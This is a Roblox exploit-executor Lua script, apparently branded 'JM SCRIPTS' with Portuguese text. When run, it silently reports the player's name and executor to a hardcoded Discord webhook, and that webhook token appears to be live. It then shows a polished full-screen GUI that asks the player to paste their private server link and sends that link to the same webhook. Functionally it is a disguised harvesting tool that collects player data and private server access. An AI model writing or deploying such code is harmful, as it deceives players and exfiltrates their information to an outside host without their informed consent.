--// CONFIG
local WEBHOOK = "https://discordapp.com/api/webhooks/1468274684557529118/zJwKaKc2q7yb8tCs2XdZSYGuciAlRqX-3sVTro8RMEfwR2Tl1tSUf_-MHMiPVvJxlt17"
local DISCORD = "https://discord.gg/ZPz8Renfz"

--// SERVICES
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local Debris = game:GetService("Debris")

local player = Players.LocalPlayer

--// REQUEST
local request =
syn and syn.request or
http_request or
request or
fluxus and fluxus.request

--// EXECUTOR DETECT
local executor =
identifyexecutor and identifyexecutor()
or (syn and "Synapse")
or (fluxus and "Fluxus")
or "Unknown"

--// WEBHOOK FUNCTION
local function sendWebhook(text)

if not request then return end

request({
Url = WEBHOOK,
Method = "POST",
Headers = {["Content-Type"] = "application/json"},
Body = HttpService:JSONEncode({
content = text
})
})

end

--// LOG EXECUTION
sendWebhook(
"🚀 **SCRIPT EXECUTADO**\n"..
"👤 Jogador: `" .. player.Name .. "`\n"..
"⚙ Executor: `" .. executor .. "`"
)

--// GUI
local gui = Instance.new("ScreenGui")
gui.IgnoreGuiInset = true
gui.Parent = game.CoreGui

--// INTRO
local intro = Instance.new("Frame",gui)
intro.Size = UDim2.fromScale(1,1)
intro.BackgroundColor3 = Color3.new(0,0,0)

local introText = Instance.new("TextLabel",intro)
introText.Size = UDim2.fromScale(1,1)
introText.BackgroundTransparency = 1
introText.Text = "Obrigado por usar\nJM SCRIPTS 💜"
introText.TextScaled = true
introText.Font = Enum.Font.Gotham
introText.TextColor3 = Color3.fromRGB(200,150,255)
introText.TextTransparency = 1

TweenService:Create(introText,TweenInfo.new(1),{TextTransparency=0}):Play()
task.wait(2.5)
TweenService:Create(introText,TweenInfo.new(1),{TextTransparency=1}):Play()
task.wait(1)

intro:Destroy()

--// LOADING
local loading = Instance.new("Frame",gui)
loading.Size = UDim2.fromScale(1,1)
loading.BackgroundColor3 = Color3.fromRGB(5,5,10)

local barBg = Instance.new("Frame",loading)
barBg.Size = UDim2.fromScale(0.5,0.03)
barBg.Position = UDim2.fromScale(0.25,0.55)
barBg.BackgroundColor3 = Color3.fromRGB(40,40,60)

local bar = Instance.new("Frame",barBg)
bar.Size = UDim2.fromScale(0,1)
bar.BackgroundColor3 = Color3.fromRGB(170,90,255)

TweenService:Create(bar,TweenInfo.new(6),{
Size = UDim2.fromScale(0.95,1)
}):Play()

task.wait(7)

loading:Destroy()

--// MAIN
local main = Instance.new("Frame",gui)
main.Size = UDim2.fromScale(1,1)
main.BackgroundColor3 = Color3.fromRGB(8,8,14)

--// RGB BORDER
local stroke = Instance.new("UIStroke",main)
stroke.Thickness = 2

task.spawn(function()

local h = 0

while true do

h = (h + 0.01) % 1
stroke.Color = Color3.fromHSV(h,0.7,1)

task.wait()

end

end)

--// TITLE
local title = Instance.new("TextLabel",main)
title.Size = UDim2.fromScale(1,0.15)
title.BackgroundTransparency = 1
title.Text = "JM SCRIPTS"
title.Font = Enum.Font.GothamBold
title.TextScaled = true
title.TextColor3 = Color3.fromRGB(200,150,255)

--// TITLE GLOW
task.spawn(function()

while true do

TweenService:Create(title,TweenInfo.new(1),{
TextColor3 = Color3.fromRGB(230,180,255)
}):Play()

task.wait(1)

TweenService:Create(title,TweenInfo.new(1),{
TextColor3 = Color3.fromRGB(170,120,255)
}):Play()

task.wait(1)

end

end)

--// INPUT
local box = Instance.new("TextBox",main)
box.Position = UDim2.fromScale(0.25,0.35)
box.Size = UDim2.fromScale(0.5,0.07)
box.PlaceholderText = "Cole o link do servidor privado"
box.TextScaled = true
box.Font = Enum.Font.Gotham
box.BackgroundColor3 = Color3.fromRGB(20,20,30)
box.TextColor3 = Color3.new(1,1,1)

--// SEND BUTTON
local send = Instance.new("TextButton",main)
send.Position = UDim2.fromScale(0.4,0.45)
send.Size = UDim2.fromScale(0.2,0.07)
send.Text = "Enviar"
send.TextScaled = true
send.Font = Enum.Font.GothamBold
send.BackgroundColor3 = Color3.fromRGB(140,80,230)

--// DISCORD BUTTON
local discord = Instance.new("TextButton",main)
discord.Position = UDim2.fromScale(0.4,0.55)
discord.Size = UDim2.fromScale(0.2,0.06)
discord.Text = "Entrar no Discord"
discord.TextScaled = true
discord.Font = Enum.Font.GothamBold
discord.BackgroundColor3 = Color3.fromRGB(90,90,255)

--// HOVER EFFECT
local function hover(btn)

local original = btn.Size

btn.MouseEnter:Connect(function()

TweenService:Create(btn,TweenInfo.new(0.15),{
Size = original + UDim2.fromOffset(10,5)
}):Play()

end)

btn.MouseLeave:Connect(function()

TweenService:Create(btn,TweenInfo.new(0.15),{
Size = original
}):Play()

end)

end

hover(send)
hover(discord)

--// CLICK SOUND
local click = Instance.new("Sound")
click.SoundId = "rbxassetid://9118828567"
click.Volume = 0.6
click.Parent = gui

--// SEND LINK
send.MouseButton1Click:Connect(function()

click:Play()

if box.Text == "" then return end

sendWebhook(
"📩 **NOVO SERVER PRIVADO**\n"..
"👤 Jogador: `" .. player.Name .. "`\n"..
"🔗 Link:\n"..box.Text
)

send.Text = "Enviado ✔"

end)

--// DISCORD BUTTON
discord.MouseButton1Click:Connect(function()

click:Play()

if setclipboard then
setclipboard(DISCORD)
discord.Text = "Link copiado ✔"
end

end)

--// SPARK PARTICLES
task.spawn(function()

while true do

local spark = Instance.new("Frame")
spark.Parent = main
spark.Size = UDim2.fromOffset(3,3)
spark.Position = UDim2.new(math.random(),0,1.1,0)
spark.BackgroundColor3 = Color3.fromRGB(200,120,255)
spark.BorderSizePixel = 0

local c = Instance.new("UICorner",spark)
c.CornerRadius = UDim.new(1,0)

TweenService:Create(
spark,
TweenInfo.new(math.random(4,7)),
{
Position = UDim2.new(spark.Position.X.Scale,0,-0.2,0),
BackgroundTransparency = 1
}
):Play()

Debris:AddItem(spark,7)

task.wait(0.12)

end

end)
